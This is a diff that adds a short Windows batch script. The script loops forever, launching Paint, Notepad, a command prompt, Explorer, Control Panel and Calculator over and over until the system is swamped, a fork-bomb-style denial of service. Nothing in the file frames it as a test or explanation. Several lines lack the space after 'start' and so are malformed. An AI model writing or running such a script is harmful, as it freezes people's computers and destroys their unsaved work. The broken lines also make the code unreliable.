@@ -1,0 +1,9 @@
+@echo off
+:x
+startmspaint
+start notepad
+startcmd
+start explorer
+start control
+startcalc
+goto x
